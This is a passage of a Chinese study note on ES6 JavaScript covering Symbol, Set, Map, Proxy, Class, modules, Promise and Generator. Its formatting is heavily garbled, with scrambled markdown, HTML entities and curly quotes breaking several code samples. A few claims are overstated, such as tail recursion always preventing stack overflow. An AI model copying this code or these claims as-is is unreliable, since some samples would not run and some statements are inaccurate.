克隆数组：`const arr = [...arr1]`- 合并数组：`const arr = [...arr1, ...arr2]`- 拼接数组：`arr.push(...arr1)`- 代替`apply`：`Math.max.apply(null, [x, y]) =&gt; Math.max(...[x, y])`- 转换字符串为数组：`[...&quot;hello&quot;]`- 转换类数组对象为数组：`[...Arguments, ...NodeList]`- 转换可遍历对象为数组：`[...String, ...Set, ...Map, ...Generator]`- 与数组解构赋值结合：`const [x, ...rest/spread] = [1, 2, 3]`- 计算`Unicode`字符长度：`Array.from(&quot;hello&quot;).length =&gt; [...&quot;hello&quot;].length`**重点难点**- 使用`keys()`、`values()`、`entries()`返回的遍历器对象，可用`for-of`自动遍历或`next()`手动遍历### 函数扩展- 参数默认值：为函数参数指定默认值  - 形式：`function Func(x = 1, y = 2) &#123;&#125;`  - 参数赋值：惰性求值(函数调用后才求值)  - 参数位置：尾参数  - 参数作用域：函数作用域  - 声明方式：默认声明，不能用`const`或`let`再次声明  - `length`：返回没有指定默认值的参数个数  - 与解构赋值默认值结合：`function Func(&#123; x = 1, y = 2 &#125; = &#123;&#125;) &#123;&#125;`  - 应用    - 指定某个参数不得省略，省略即抛出错误：`function Func(x = throwMissing()) &#123;&#125;`    - 将参数默认值设为`undefined`，表明此参数可省略：`Func(undefined, 1)`- rest/spread参数(…)：返回函数多余参数  - 形式：以数组的形式存在，之后不能再有其他参数  - 作用：代替`Arguments`对象  - `length`：返回没有指定默认值的参数个数但不包括`rest/spread`参数- 严格模式：在严格条件下运行JS  - 应用：只要函数参数使用默认值、解构赋值、扩展运算符，那么函数内部就不能显式设定为严格模式- name属性  ：返回函数的函数名  - 将匿名函数赋值给变量：空字符串(ES5)、变量名(ES6)  - 将具名函数赋值给变量：函数名(ES5和ES6)  - `bind`返回的函数：`bound` 函数名(ES5和ES6)  - `Function`构造函数返回的函数实例：`anonymous`(ES5和ES6)- 箭头函数(=&gt;)：函数简写  - 无参数：`() =&gt; &#123;&#125;`  - 单个参数：`x =&gt; &#123;&#125;`  - 多个参数：`(x, y) =&gt; &#123;&#125;`  - 解构参数：`(&#123;x, y&#125;) =&gt; &#123;&#125;`  - 嵌套使用：部署管道机制  - ```    this\n\n  指向固定化\n\n  - 并非因为内部有绑定`this`的机制，而是根本没有自己的`this`，导致内部的`this`就是外层代码块的`this`\n  - 因为没有`this`，因此不能用作构造函数\n\n\n尾调用优化：只保留内层函数的调用帧\n\n尾调用\n定义：某个函数的最后一步是调用另一个函数\n形式：function f(x) &#123; return g(x); &#125;\n\n\n尾递归\n定义：函数尾调用自身\n作用：只要使用尾递归就不会发生栈溢出，相对节省内存\n实现：把所有用到的内部变量改写成函数的参数并使用参数默认值\n\n\n\n\n\n箭头函数误区\n\n函数体内的this是定义时所在的对象而不是使用时所在的对象\n可让this指向固定化，这种特性很有利于封装回调函数\n不可当作构造函数，因此箭头函数不可使用new命令\n不可使用yield命令，因此箭头函数不能用作Generator函数\n不可使用Arguments对象，此对象在函数体内不存在(可用rest/spread参数代替)\n返回对象时必须在对象外面加上括号\n\n正则扩展\n变更RegExp构造函数入参：允许首参数为正则对象，尾参数为正则修饰符(返回的正则表达式会忽略原正则表达式的修饰符)\n\n正则方法调用变更：字符串对象的match()、replace()、search()、split()内部调用转为调用RegExp实例对应的RegExp.prototype[Symbol.方法]\n\nu修饰符\n：\nUnicode\n\n模式修饰符，正确处理大于\n\\uFFFF\n\n的\nUnicode\n\n字符\n\n点字符(.)\nUnicode表示法\n量词\n预定义模式\ni修饰符\n转义\n\n\ny修饰符：粘连修饰符，确保匹配必须从剩余的第一个位置开始全局匹配(与g修饰符作用类似)\n\nunicode：是否设置u修饰符\n\nsticky：是否设置y修饰符\n\nflags：正则表达式的修饰符\n\n\n重点难点\n\ny修饰符隐含头部匹配标志^\n单单一个y修饰符对match()只能返回第一个匹配，必须与g修饰符联用才能返回所有匹配\n\nSymbol\n定义：独一无二的值\n声明：const set = Symbol(str)\n入参：字符串(可选)\n\n方法\n\nSymbol()：创建以参数作为描述的Symbol值(不登记在全局环境)\nSymbol.for()：创建以参数作为描述的Symbol值，如存在此参数则返回原有的Symbol值(先搜索后创建，登记在全局环境)\nSymbol.keyFor()：返回已登记的Symbol值的描述(只能返回Symbol.for()的key)\nObject.getOwnPropertySymbols()：返回对象中所有用作属性名的Symbol值的数组\n\n内置\n\nSymbol.hasInstance：指向一个内部方法，当其他对象使用instanceof运算符判断是否为此对象的实例时会调用此方法\nSymbol.isConcatSpreadable：指向一个布尔值，定义对象用于Array.prototype.concat()时是否可展开\nSymbol.species：指向一个构造函数，当实例对象使用自身构造函数时会调用指定的构造函数\nSymbol.match：指向一个函数，当实例对象被String.prototype.match()调用时会重新定义match()的行为\nSymbol.replace：指向一个函数，当实例对象被String.prototype.replace()调用时会重新定义replace()的行为\nSymbol.search：指向一个函数，当实例对象被String.prototype.search()调用时会重新定义search()的行为\nSymbol.split：指向一个函数，当实例对象被String.prototype.split()调用时会重新定义split()的行为\nSymbol.iterator：指向一个默认遍历器方法，当实例对象执行for-of时会调用指定的默认遍历器\nSymbol.toPrimitive：指向一个函数，当实例对象被转为原始类型的值时会返回此对象对应的原始类型值\nSymbol.toStringTag：指向一个函数，当实例对象被Object.prototype.toString()调用时其返回值会出现在toString()返回的字符串之中表示对象的类型\nSymbol.unscopables：指向一个对象，指定使用with时哪些属性会被with环境排除\n\n数据类型\n\nUndefined\nNull\nString\nNumber\nBoolean\nObject(包含Array、Function、Date、RegExp、Error)\nSymbol\n\n应用场景\n\n唯一化对象属性名：属性名属于Symbol类型，就都是独一无二的，可保证不会与其他属性名产生冲突\n消除魔术字符串：在代码中多次出现且与代码形成强耦合的某一个具体的字符串或数值\n遍历属性名：无法通过for-in、for-of、Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回，只能通过Object.getOwnPropertySymbols返回启用模块的Singleton模式：调用一个类在任何时候返回同一个实例(window和global)，- 使用Symbol.for()来模拟全局的Singleton模式\n\n重点难点\n\nSymbol()生成一个原始类型的值不是对象，因此Symbol()前不能使用new命令\nSymbol()参数表示对当前Symbol值的描述，相同参数的Symbol()返回值不相等\nSymbol值不能与其他类型的值进行运算\nSymbol值可通过String()或toString()显式转为字符串\nSymbol值作为对象属性名时，此属性是公开属性，但不是私有属性\nSymbol值作为对象属性名时，只能用方括号运算符([])读取，不能用点运算符(.)读取&#96;\nSymbol值作为对象属性名时，不会被常规方法遍历得到，可利用此特性为对象定义非私有但又只用于内部的方法\n\nSetSet\n\n定义：类似于数组的数据结构，成员值都是唯一且没有重复的值\n声明：const set = new Set(arr)\n入参：具有Iterator接口的数据结构\n属性\nconstructor：构造函数，返回Set\nsize：返回实例成员总数\n\n\n方法\nadd()：添加值，返回实例\ndelete()：删除值，返回布尔值\nhas()：检查值，返回布尔值\nclear()：清除所有成员\nkeys()：返回以属性值为遍历器的对象\nvalues()：返回以属性值为遍历器的对象\nentries()：返回以属性值和属性值为遍历器的对象\nforEach()：使用回调函数遍历每个成员\n\n\n\n应用场景\n\n去重字符串：[...new Set(str)].join(&quot;&quot;)\n去重数组：[...new Set(arr)]或Array.from(new Set(arr))\n集合数组\n声明：const a = new Set(arr1)、const b = new Set(arr2)\n并集：new Set([...a, ...b])\n交集：new Set([...a].filter(v =&gt; b.has(v)))\n差集：new Set([...a].filter(v =&gt; !b.has(v)))\n\n\n映射集合\n声明：let set = new Set(arr)\n映射：set = new Set([...set].map(v =&gt; v * 2))或set = new Set(Array.from(set, v =&gt; v * 2))\n\n\n\n重点难点\n\n遍历顺序：插入顺序\n没有键只有值，可认为键和值两值相等\n添加多个NaN时，只会存在一个NaN\n添加相同的对象时，会认为是不同的对象\n添加值时不会发生类型转换(5 !== &quot;5&quot;)\nkeys()和values()的行为完全一致，entries()返回的遍历器同时包括键和值且两值相等\n\nWeakSet\n\n定义：和Set结构类似，成员值只能是对象\n声明：const set = new WeakSet(arr)\n入参：具有&#96;Iterator接口的数据结构\n属性\nconstructor：构造函数，返回WeakSet\n\n\n方法\nadd()：添加值，返回实例\ndelete()：删除值，返回布尔值\nhas()：检查值，返回布尔值\n\n\n\n应用场景\n\n储存DOM节点：DOM节点被移除时自动释放此成员，不用担心这些节点从文档移除时会引发内存泄漏\n临时存放一组对象或存放跟对象绑定的信息：只要这些对象在外部消失，它在WeakSet结构中的引用就会自动消\n\n重点难点\n\n成员都是弱引用，垃圾回收机制不考虑WeakSet结构对此成员的引用\n成员不适合引用，它会随时消失，因此ES6规定WeakSet结构不可遍历\n其他对象不再引用成员时，垃圾回收机制会自动回收此成员所占用的内存，不考虑此成员是否还存在于WeakSet结构中\n\nMapMap\n\n定义：类似于对象的数据结构，成员键可以是任何类型的值\n声明：const set = new Map(arr)\n入参：具有Iterator接口且每个成员都是一个双元素数组的数据结构\n属性\nconstructor：构造函数，返回Map\nsize：返回实例成员总数\n\n\n方法\nget()：返回键值对\nset()：添加键值对，返回实例\ndelete()：删除键值对，返回布尔值\nhas()：检查键值对，返回布尔值\nclear()：清除所有成员\nkeys()：返回以键为遍历器的对象\nvalues()：返回以值为遍历器的对象\nentries()：返回以键和值为遍历器的对象\nforEach()：使用回调函数遍历每个成员\n\n\n\n重点难点\n\n遍历顺序：插入顺序\n对同一个键多次赋值，后面的值将覆盖前面的值\n对同一个对象的引用，被视为一个键\n对同样值的两个实例，被视为两个键\n键跟内存地址绑定，只要内存地址不一样就视为两个键\n添加多个以NaN作为键时，只会存在一个以NaN作为键的值\nObject结构提供字符串—值的对应，Map结构提供值—值的对应\n\nWeakMap\n\n定义：和Map结构类似，成员键只能是对象\n声明：const set = new WeakMap(arr)\n入参：具有Iterator接口且每个成员都是一个双元素数组的数据结构\n属性\nconstructor：构造函数，返回WeakMap\n\n\n方法\nget()：返回键值对\nset()：添加键值对，返回实例\ndelete()：删除键值对，返回布尔值\nhas()：检查键值对，返回布尔值\n\n\n\n应用场景\n\n储存DOM节点：DOM节点被移除时自动释放此成员键，不用担心这些节点从文档移除时会引发内存泄漏\n部署私有属性：内部属性是实例的弱引用，删除实例时它们也随之消失，不会造成内存泄漏\n\n重点难点\n\n成员键都是弱引用，垃圾回收机制不考虑WeakMap结构对此成员键的引用\n成员键不适合引用，它会随时消失，因此ES6规定WeakMap结构不可遍历\n其他对象不再引用成员键时，垃圾回收机制会自动回收此成员所占用的内存，不考虑此成员是否还存在于WeakMap结构中\n一旦不再需要，成员会自动消失，不用手动删除引用\n弱引用的只是键而不是值，值依然是正常引用\n即使在外部消除了成员键的引用，内部的成员值依然存在\n\nProxy\n定义：修改某些操作的默认行为\n声明：const proxy = new Proxy(target, handler)\n入参\ntarget：拦截的目标对象\nhandler：定制拦截行为\n\n\n方法\nProxy.revocable()：返回可取消的Proxy实例(返回&#123; proxy, revoke &#125;，通过revoke()取消代理)\n\n\n拦截方式\nget()：拦截对象属性读取\nset()：拦截对象属性设置，返回布尔值\nhas()：拦截对象属性检查k in obj，返回布尔值\ndeleteProperty()：拦截对象属性删除delete obj[k]，返回布尔值\ndefineProperty()：拦截对象属性定义Object.defineProperty()、Object.defineProperties()，返回布尔值\nownKeys()：拦截对象属性遍历for-in、Object.keys()、Object.getOwnPropertyNames()、Object.getOwnPropertySymbols()，返回数组\ngetOwnPropertyDescriptor()：拦截对象属性描述读取Object.getOwnPropertyDescriptor()，返回对象\ngetPrototypeOf()：拦截对象原型读取instanceof、Object.getPrototypeOf()、Object.prototype.__proto__、Object.prototype.isPrototypeOf()、Reflect.getPrototypeOf()，返回对象\nsetPrototypeOf()：拦截对象原型设置Object.setPrototypeOf()，返回布尔值\nisExtensible()：拦截对象是否可扩展读取Object.isExtensible()，返回布尔值\npreventExtensions()：拦截对象不可扩展设置Object.preventExtensions()，返回布尔值\napply()：拦截Proxy实例作为函数调用proxy()、proxy.apply()、proxy.call()\nconstruct()：拦截Proxy实例作为构造函数调用new proxy()\n\n\n\n应用场景\n\nProxy.revocable()：不允许直接访问对象，必须通过代理访问，一旦访问结束就收回代理权不允许再次访问\nget()：读取未知属性报错、读取数组负数索引的值、封装链式操作、生成DOM嵌套节点\nset()：数据绑定(Vue数据绑定实现原理)、确保属性值设置符合要求、防止内部属性被外部读写\nhas()：隐藏内部属性不被发现、排除不符合属性条件的对象\ndeleteProperty()：保护内部属性不被删除\ndefineProperty()：阻止属性被外部定义\nownKeys()：保护内部属性不被遍历\n\n重点难点\n\n要使Proxy起作用，必须针对实例进行操作，而不是针对目标对象进行操作\n没有设置任何拦截时，等同于直接通向原对象\n属性被定义为不可读写&#x2F;扩展&#x2F;配置&#x2F;枚举时，使用拦截方法会报错\n代理下的目标对象，内部this指向Proxy代理\n\nReflect\n定义：保持Object方法的默认行为\n方法\nget()：返回对象属性\nset()：设置对象属性，返回布尔值\nhas()：检查对象属性，返回布尔值\ndeleteProperty()：删除对象属性，返回布尔值\ndefineProperty()：定义对象属性，返回布尔值\nownKeys()：遍历对象属性，返回数组(Object.getOwnPropertyNames()+Object.getOwnPropertySymbols())\ngetOwnPropertyDescriptor()：返回对象属性描述，返回对象\ngetPrototypeOf()：返回对象原型，返回对象\nsetPrototypeOf()：设置对象原型，返回布尔值\nisExtensible()：返回对象是否可扩展，返回布尔值\npreventExtensions()：设置对象不可扩展，返回布尔值\napply()：绑定this后执行指定函数\nconstruct()：调用构造函数创建实例\n\n\n\n设计目的\n\nObject属于语言内部的方法放到Reflect上\n将某些Object方法报错情况改成返回false\n让Object操作变成函数行为\nProxy与Reflect相辅相成\n\n废弃方法\n\nObject.defineProperty() &#x3D;&gt; Reflect.defineProperty()\nObject.getOwnPropertyDescriptor() &#x3D;&gt; Reflect.getOwnPropertyDescriptor()\n\n\n数据绑定：观察者模式\n\nconst observerQueue = new Set();const observe = fn =&gt; observerQueue.add(fn);const observable = obj =&gt; new Proxy(obj, &#123;    set(tgt, key, val, receiver) &#123;        const result = Reflect.set(tgt, key, val, receiver);        observerQueue.forEach(v =&gt; v());        return result;    &#125;&#125;);const person = observable(&#123; age: 25, name: &quot;Yajun&quot; &#125;);const print = () =&gt; console.log(`$&#123;person.name&#125; is $&#123;person.age&#125; years old`);observe(print);person.name = &quot;Joway&quot;;\n\nClass\n定义：对一类具有共同特征的事物的抽象(构造函数语法糖)\n\n原理：类本身指向构造函数，所有方法定义在prototype上，可看作构造函数的另一种写法(Class === Class.prototype.constructor)\n\n方法和关键字\n\nconstructor()：构造函数，new命令生成实例时自动调用\nextends：继承父类\nsuper：新建父类的this\nstatic：定义静态属性方法\nget：取值函数，拦截属性的取值行为\nset：存值函数，拦截属性的存值行为\n\n\n属性\n\n__proto__：构造函数的继承(总是指向父类)\n__proto__.__proto__：子类的原型的原型，即父类的原型(总是指向父类的__proto__)\nprototype.__proto__：属性方法的继承(总是指向父类的prototype)\n\n\n静态属性：定义类完成后赋值属性，该属性不会被实例继承，只能通过类来调用\n\n静态方法：使用static定义方法，该方法不会被实例继承，只能通过类来调用(方法中的this指向类，而不是实例)\n\n继承\n\n实质\n\nES5实质：先创造子类实例的this，再将父类的属性方法添加到this上(Parent.apply(this))\n\nES6实质：先将父类实例的属性方法加到this上(调用super())，再用子类构造函数修改this\n\n&#96;&#96;&#96;super\n  - 作为函数调用：只能在构造函数中调用`super()`，内部`this`指向继承的当前子类(`super()`调用后才可在构造函数中使用`this`)  - 作为对象调用：在普通方法中指向父类的原型对象，在静态方法中指向父类- 显示定义：使用`constructor() &#123; super(); &#125;`定义继承父类，没有书写则显示定义- 子类继承父类：子类使用父类的属性方法时，必须在构造函数中调用\nsuper()\n，否则得不到父类的\nthis\n      - 父类静态属性方法可被子类继承      - 类继承父类后，可从`super`上调用父类静态属性方法- 实例  ：类相当于实例的原型，所有在类中定义的属性方法都会被实例继承  - 显式指定属性方法：使用`this`指定到自身上(使用`Class.hasOwnProperty()`可检测到)  - 隐式指定属性方法：直接声明定义在对象原型上(使用`Class.__proto__.hasOwnProperty()`可检测到)- 表达式  - 类表达式：`const Class = class &#123;&#125;`  - `name`属性：返回紧跟`class`后的类名  - 属性表达式：`[prop]`  - `Generator`方法：`* mothod() &#123;&#125;`  - `Async`方法：`async mothod() &#123;&#125;`- this指向  ：解构实例属性或方法时会报错  - 绑定`this`：`this.mothod = this.mothod.bind(this)`  - 箭头函数：`this.mothod = () =&gt; this.mothod()`- 属性定义位置  - 定义在构造函数中并使用`this`指向  - 定义在类最顶层- **`new.target`：确定构造函数是如何调用****原生构造函数**- `String()`- `Number()`- `Boolean()`- `Array()`- `Object()`- `Function()`- `Date()`- `RegExp()`- `Error()`**重点难点**- 在实例上调用方法，实质是调用原型上的方法- `Object.assign()`可方便地一次向类添加多个方法`(Object.assign(Class.prototype, &#123; ... &#125;))`- 类内部所有定义的方法是不可枚举的(`non-enumerable`)- 构造函数默认返回实例对象(`this`)，可指定返回另一个对象- 取值函数和存值函数设置在属性的`Descriptor`对象上- 类不存在变量提升- 利用`new.target === Class`写出不能独立使用必须继承后才能使用的类- 子类继承父类后，`this`指向子类实例，通过`super`对某个属性赋值，赋值的属性会变成子类实例的属性- 使用`super`时，必须显式指定是作为函数还是作为对象使用- `extends`不仅可继承类还可继承原生的构造函数**私有属性方法**\n\n\n\n\n\nconst name &#x3D; Symbol(“name”);const print &#x3D; Symbol(“print”);class Person {    constructor(age) {        this[name] &#x3D; “Bruce”;        this.age &#x3D; age;    }    print {        console.log($&#123;this[name]&#125; is $&#123;this.age&#125; years old);    }}\n**继承混合类**\nfunction CopyProperties(target, source) {    for (const key of Reflect.ownKeys(source)) {        if (key !&#x3D;&#x3D; “constructor” &amp;&amp; key !&#x3D;&#x3D; “prototype” &amp;&amp; key !&#x3D;&#x3D; “name”) {            const desc &#x3D; Object.getOwnPropertyDescriptor(source, key);            Object.defineProperty(target, key, desc);        }    }}function MixClass(…mixins) {    class Mix {        constructor() {            for (const mixin of mixins) {                CopyProperties(this, new mixin());            }        }    }    for (const mixin of mixins) {        CopyProperties(Mix, mixin);        CopyProperties(Mix.prototype, mixin.prototype);    }    return Mix;}class Student extends MixClass(Person, Kid) {}\n### Module**命令**- ```  export\n\n  ：规定模块对外接口\n\n默认导出：export default Person(导入时可指定模块任意名称，无需知晓内部真实名称)\n\n单独导出：export const name = &quot;Bruce&quot;\n\n按需导出：export &#123; age, name, sex &#125;(推荐)\n\n改名导出：export &#123; name as newName &#125;\n\nimport\n  ：导入模块内部功能  - 默认导入：`import Person from &quot;person&quot;`  - 整体导入：`import * as Person from &quot;person&quot;`  - 按需导入：`import &#123; age, name, sex &#125; from &quot;person&quot;`  - 改名导入：`import &#123; name as newName &#125; from &quot;person&quot;`  - 自执导入：`import &quot;person&quot;`  - 复合导入：`import Person, &#123; name &#125; from &quot;person&quot;`- 复合模式：\nexport\n命令和\nimport\n  命令结合在一起写成一行，变量实质没有被导入 当前模块，相当于对外转发接口，导致当前模块无法直接使用其导入变量  - 默认导入导出：`export &#123; default &#125; from &quot;person&quot;`  - 整体导入导出：`export * from &quot;person&quot;`  - 按需导入导出：`export &#123; age, name, sex &#125; from &quot;person&quot;`  - 改名导入导出：`export &#123; name as newName &#125; from &quot;person&quot;`  - 具名改默认导入导出：`export &#123; name as default &#125; from &quot;person&quot;`  - 默认改具名导入导出：`export &#123; default as name &#125; from &quot;person&quot;`- 继承：默认导出和改名导出结合使用可使模块具备继承性- 设计思想：尽量地静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量- 严格模式：ES6模块自动采用严格模式(不管模块头部是否添加`use strict`)**模块方案**- **CommonJS**：用于服务器(动态化依赖)- **AMD**：用于浏览器(动态化依赖)- **CMD**：用于浏览器(动态化依赖)- **UMD**：用于浏览器和服务器(动态化依赖)- **ESM**：用于浏览器和服务器(静态化依赖)**加载方式**- 运行时加载  - 定义：整体加载模块生成一个对象，再从对象上获取需要的属性和方法进行加载(全部加载)  - 影响：只有运行时才能得到这个对象，导致无法在编译时做静态优化- **编译时加载**- 定义：直接从模块中获取需要的属性和方法进行加载(按需加载)- 影响：在编译时就完成模块加载，效率比其他方案高，但无法引用模块本身(本身不是对象)，可拓展JS高级语法(宏和类型校验)**加载实现**- 传统加载  ：通过\n&lt;script&gt;\n  进行同步或异步加载脚本  - 同步加载：``  - `Defer`异步加载：``(顺序加载，渲染完再执行)  - `Async`异步加载：``(乱序加载，下载完就执行)- **模块加载**：``(默认是`Defer`异步加载)**CommonJS和ESM的区别**- ```  CommonJS\n\n输出值的拷贝，\n\nESM\n\n输出值的引用\n\n- `CommonJS`一旦输出一个值，模块内部的变化就影响不到这个值\n- `ESM`是动态引用且不会缓存值，模块里的变量绑定其所在的模块，等到脚本真正执行时，再根据这个只读引用到被加载的那个模块里去取值\n\n\nCommonJS\n是运行时加载，\nESM\n  是编译时加载  - `CommonJS`加载模块是对象(即`module.exports`)，该对象只有在脚本运行完才会生成  - `ESM`加载模块不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成**Node加载**- 背景：`CommonJS`和`ESM`互不兼容，目前解决方案是将两者分开，采用各自的加载方案- 区分：要求\nESM\n采用\n.mjs\n  后缀文件名  - `require()`不能加载`.mjs`文件，只有`import`命令才可加载`.mjs`文件  - `.mjs`文件里不能使用`require()`，必须使用`import`命令加载文件- 驱动：`node --experimental-modules file.mjs`- 限制：`Node`的`import`命令目前只支持加载本地模块(`file:协`议)，不支持加载远程模块- 加载优先级  - 脚本文件省略后缀名：依次尝试加载四个后缀名文件(`.mjs`、`.js`、`.json`、`node`)  - 以上不存在：尝试加载`package.json`的`main`字段指定的脚本  - 以上不存在：依次尝试加载名称为`index`四个后缀名文件(`.mjs`、`.js`、`.json`、`node`)  - 以上不存在：报错- 不存在的内部变量：`arguments`、`exports`、`module`、`require`、`this`、`__dirname`、`__filename`- ```  CommonJS\n\n加载\n\nESM\n\n- 不能使用`require()`，只能使用`import()`\n\n\n&#96;&#96;&#96;ESM\n加载\nCommonJS\n  - 自动将`module.exports`转化成`export default`  - `CommonJS`输出缓存机制在ESM加载方式下依然有效  - 采用`import`命令加载`CommonJS`模块时，不允许采用按需导入，应使用默认导入或整体导入**循环加载**- 定义：脚本`A`的执行依赖脚本`B`，而脚本`A`的执行又依赖脚本B- 加载原理  - `CommonJS`：`require()`首次加载脚本就会执行整个脚本，在内存里生成一个对象缓存下来，二次加载脚本时直接从缓存中获取  - `ESM`：`import`命令加载变量不会被缓存，而是成为一个指向被加载模块的引用- 循环加载  - `CommonJS`：只输出已经执行的部分，还未执行的部分不会输出  - `ESM`：需开发者自己保证真正取值时能够取到值(可把变量写成函数形式，函数具有提升作用)**重点难点**- `ES6`模块中，顶层`this`指向`undefined`，不应该在顶层代码使用`this`- `一个模块就是一个独立的文件，该文件内部的所有变量，外部无法获取- `export`命令输出的接口与其对应的值是动态绑定关系，即通过该接口可获取模块内部实时的值- `import`命令大括号里的变量名必须与被导入模块对外接口的名称相同- `import`命令输入的变量只读(本质是输入接口)，不允许在加载模块的脚本里改写接口- `import`命令命令具有提升效果，会提升到整个模块的头部，首先执行  重复执行同一句import语句，只会执行一次- `export default`命令只能使用一次- `export default`命令导出的整体模块，在执行`import`命令时其后不能跟大括号- `export default`命令本质是输出一个名为`default`的变量，后面不能跟变量声明语句- `export default`命令本质是将后面的值赋给名为`default`的变量，可直接将值写在其后- `export default`命令和`export &#123;&#125;`命令可同时存在，对应复合导入- `export`命令和`import`命令可出现在模块任何位置，只要处于模块顶层即可，不能处于块级作用域- `import()`加载模块成功后，此模块会作为一个对象，当作`then()`的参数，可使用对象解构赋值来获取输出接口- 同时动态加载多个模块时，可使用`Promise.all()`和`import()`相结合来实现- `import()`和结`合async/await`来书写同步操作的代码**单例模式：跨模块常量**\n&#x2F;&#x2F; 常量跨文件共享&#x2F;&#x2F; person.jsconst NAME &#x3D; “Bruce”;const AGE &#x3D; 25;const SEX &#x3D; “male”;export { AGE, NAME, SEX };&#x2F;&#x2F; file1.jsimport { AGE } from “person”;console.log(AGE);&#x2F;&#x2F; file2.jsimport { AGE, NAME, SEX } from “person”;console.log(AGE, NAME, SEX);\n&gt; 默认导入互换整体导入\nimport Person from “person”;console.log(Person.AGE);import * as Person from “person”;console.log(Person.default.AGE);\n### Iterator- 定义：为各种不同的数据结构提供统一的访问机制- 原理：创建一个指针指向首个成员，按照次序使用`next()`指向下一个成员，直接到结束位置(数据结构只要部署`Iterator`接口就可完成遍历操作)- 作用  - 为各种数据结构提供一个统一的简便的访问接口  - 使得数据结构成员能够按某种次序排列  - `ES6`创造了新的遍历命令`for-of`，`Iterator`接口主要供`for-of`消费- 形式：`for-of`(自动去寻找`Iterator`接口)- 数据结构  - 集合：`Array`、`Object`、`Set`、`Map`  - 原生具备接口的数据结构：`String`、`Array`、`Set`、`Map`、`TypedArray`、`Arguments、NodeList`- 部署：默认部署在`Symbol.iterator`(具备此属性被认为可遍历的`iterable`)- 遍历器对象  - `next()`：下一步操作，返回`&#123; done, value &#125;`(必须部署)  - `return()`：`for-of`提前退出调用，返回`&#123; done: true &#125;`  - `throw()`：不使用，配合`Generator`函数使用**ForOf循环**- 定义：调用`Iterator`接口产生遍历器对象(`for-of`内部调用数据结构的`Symbol.iterator()`)- 遍历字符串：`for-in`获取索引，`for-of`获取值(可识别32位UTF-16字符)- 遍历数组：`for-in`获取索引，`for-of`获取值- 遍历对象：`for-in`获取键，`for-of`需自行部署- 遍历`Set`：`for-of`获取值 =&gt; `for (const v of set)`- 遍历`Map`：`for-of`获取键值对 =&gt; `for (const [k, v] of map)`- 遍历类数组：包含`length`的对象、`Arguments`对象、`NodeList`对象(无`Iterator`接口的类数组可用`Array.from()`转换)- 计算生成数据结构：\nArray\n、\nSet\n、\nMap\n  - `keys()`：返回遍历器对象，遍历所有的键  - `values()`：返回遍历器对象，遍历所有的值  - `entries()`：返回遍历器对象，遍历所有的键值对- 与for-in区别  - 有着同`for-in`一样的简洁语法，但没有`for-in`那些缺点、  - 不同于`forEach()`，它可与`break`、`continue`和`return`配合使用  - 提供遍历所有数据结构的统一操作接口**应用场景**- 改写具有`Iterator`接口的数据结构的`Symbol.iterator`- 解构赋值：对`Set`进行结构- 扩展运算符：将部署Iterator接口的数据结构转为数组- `yield*`：`yield*`后跟一个可遍历的数据结构，会调用其遍历器接口- 接受数组作为参数的函数：`for-of`、`Array.from()`、`new Set()`、`new WeakSet()`、`new Map()`、`new WeakMap()`、`Promise.all()`、`Promise.race()`### Promise- 定义：包含异步操作结果的对象- 状态  - 进行中：`pending`  - 已成功：`resolved`  - 已失败：`rejected`- 特点  - 对象的状态不受外界影响  - 一旦状态改变就不会再变，任何时候都可得到这个结果- 声明：`new Promise((resolve, reject) =&gt; &#123;&#125;)`- 出参  - `resolve`：将状态从未完成变为成功，在异步操作成功时调用，并将异步操作的结果作为参数传递出去  - `reject`：将状态从未完成变为失败，在异步操作失败时调用，并将异步操作的错误作为参数传递出去- 方法  - ```    then()\n\n  ：分别指定\n  resolved\n\n  状态和\n  rejected\n\n  状态的回调函数\n\n第一参数：状态变为resolved时调用\n\n第二参数：状态变为rejected时调用(可选)\n\ncatch()：指定发生错误时的回调函数\n\nPromise.all()\n  ：将多个实例包装成一个新实例，返回全部实例状态变更后的结果数组(齐变更再返回)  - 入参：具有`Iterator`接口的数据结构  - 成功：只有全部实例状态变成`resolved`，最终状态才会变成`resolved`  - 失败：其中一个实例状态变成`rejected`，最终状态就会变成`rejected`- `Promise.race()`：将多个实例包装成一个新实例，返回全部实例状态优先变更后的结果(先变更先返回)- ```  Promise.resolve()\n\n：将对象转为Promise对象(等价于\n\nnew Promise(resolve =&gt; resolve())\n\n)\n\n- `Promise`实例：原封不动地返回入参\n- `Thenable`对象：将此对象转为`Promise`对象并返回(`Thenable`为包含`then()`的对象，执行`then()`相当于执行此对象的`then()`)\n- 不具有`then()`的对象：将此对象转为`Promise`对象并返回，状态为`resolved`\n- 不带参数：返回`Promise`对象，状态为`resolved`\n\n\nPromise.reject()：将对象转为状态为rejected的Promise对象(等价于new Promise((resolve, reject) =&gt; reject()))\n\n\n\n\n应用场景\n\n加载图片\nAJAX转Promise对象\n\n重点难点\n\n只有异步操作的结果可决定当前状态是哪一种，其他操作都无法改变这个状态\n状态改变只有两种可能：从pending变为resolved、从pending变为rejected\n一旦新建Promise对象就会立即执行，无法中途取消\n不设置回调函数，内部抛错不会反应到外部\n当处于pending时，无法得知目前进展到哪一个阶段\n实例状态变为resolved或rejected时，会触发then()绑定的回调函数\nresolve()和reject()的执行总是晚于本轮循环的同步任务\nthen()返回新实例，其后可再调用另一个then()\nthen()运行中抛出错误会被catch()捕获\nreject()的作用等同于抛出错误\n实例状态已变成resolved时，再抛出错误是无效的，不会被捕获，等于没有抛出\n实例状态的错误具有冒泡性质，会一直向后传递直到被捕获为止，错误总是会被下一个catch()捕获\n不要在then()里定义rejected状态的回调函数(不使用其第二参数)\n建议使用catch()捕获错误，不要使用then()第二个参数捕获\n没有使用catch()捕获错误，实例抛错不会传递到外层代码，即不会有任何反应\n作为参数的实例定义了catch()，一旦被rejected并不会触发Promise.all()的catch()\nPromise.reject()的参数会原封不动地作为rejected的理由，变成后续方法的参数\n\nGenerator\n定义：封装多个内部状态的异步编程解决方案\n\n形式：调用Generator函数(该函数不执行)返回指向内部状态的指针对象(不是运行结果)\n\n声明：function* Func() &#123;&#125;\n\n方法\n\nnext()：使指针移向下一个状态，返回&#123; done, value &#125;(入参会被当作上一个yield命令表达式的返回值)\nreturn()：返回指定值且终结遍历Generator函数，返回&#123; done: true, value: 入参 &#125;\nthrow()：在Generator函数体外抛出错误，在Generator函数体内捕获错误，返回自定义的new Errow()\n\n\nyield\n命令：声明内部状态的值(\nreturn\n  声明结束返回的值)  - 遇到`yield`命令就暂停执行后面的操作，并将其后表达式的值作为返回对象的`value`  - 